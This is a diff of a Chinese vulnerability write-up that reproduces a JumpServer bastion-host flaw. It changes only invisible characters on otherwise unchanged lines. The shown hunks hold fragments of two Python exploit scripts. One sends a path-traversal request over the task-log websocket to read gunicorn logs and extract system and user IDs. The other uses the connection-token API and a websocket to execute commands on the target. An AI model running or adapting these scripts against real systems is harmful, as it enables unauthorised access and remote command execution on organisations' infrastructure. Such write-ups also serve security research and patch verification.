@@ -10,7 +10,7 @@ source: "MrWQ/vulnerability-paper"
 
   
 
-**点击蓝字 ·  关注我们**
+**点击蓝字 ·  关注我们**
 
 **01**
 
@@ -20,11 +20,11 @@ source: "MrWQ/vulnerability-paper"
 
 ‍
 
- JumpServer 开源堡垒机部署广泛, 遵循 GNU GPL v2.0 开源协议, 是符合 4A 的专业运维安全审计系统  
+ JumpServer 开源堡垒机部署广泛, 遵循 GNU GPL v2.0 开源协议, 是符合 4A 的专业运维安全审计系统  
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGy4CIvwHiaRicbONMEpm570lDy9K02VnxqS0sTFN1u9ic6AsVYAuwx9jBRcS02QicCLe21qQFygXicbDg/640?wx_fmt=png)
 
- 网上公众号 && 大佬的分析文章已经很多了，参考了 360 安全忍者师傅的分析以后，替大家踩踩坑做一下复现。
+ 网上公众号 && 大佬的分析文章已经很多了，参考了 360 安全忍者师傅的分析以后，替大家踩踩坑做一下复现。
 
 **02**
 
@@ -41,7 +41,7 @@ source: "MrWQ/vulnerability-paper"
 **获取日志**
 
 ```
-#进行日志读取 获取 (system_id,target_id,system_user_id)
+#进行日志读取 获取 (system_id,target_id,system_user_id)
 import asyncio
 import websockets
 import json
@@ -52,12 +52,12 @@ try:
 except:
     print("example: python jumpserver_getlog_edi.py 127.0.0.1:8080")
     exit()
-async def send_msg(websocket,_text):
+async def send_msg(websocket,_text):
     print("##########send payload")
     print("##########wait some time")
     await websocket.send(_text)
     recv_text = await websocket.recv()
-    print(recv_text)
+    print(recv_text)
 async def main_logic():
     async with websockets.connect(f"ws://{ip}/ws/ops/tasks/log/") as websocket:
         _text = json.dumps({"task": "../../../../../../../opt/jumpserver/logs/gunicorn"})
@@ -73,7 +73,7 @@ async def main_logic():
                 s = pattern.search(recv_text['message'])
                 print(s.groupdict())
             if len(recv_text['message']) < 100:
-                break
+                break
 asyncio.get_event_loop().run_until_complete(main_logic())
 print("end")
 ```
@@ -89,7 +89,7 @@ import asyncio
 import websockets
 import requests
 import json
-url = "/api/v1/authentication/connection-token/?user-only=None"
+url = "/api/v1/authentication/connection-token/?user-only=None"
 async def send_msg(websocket,_text):
     if _text == "exit":
         print(f'you have enter "exit", goodbye')
@@ -97,7 +97,7 @@ async def send_msg(websocket,_text):
         return False
     await websocket.send(_text)
     recv_text = await websocket.recv()
-    print(f"{recv_text}")
+    print(f"{recv_text}")
 async def main_logic(cmd):
     print("#######start ws")
     async with websockets.connect(target) as websocket:
@@ -122,7 +122,7 @@ async def main_logic(cmd):
         for i in range(4):
             recv_text = await websocket.recv()
             print(f"{recv_text}")
-        print('#######finish')
+        print('#######finish')
 if __name__ == '__main__':
     try:
         import sys
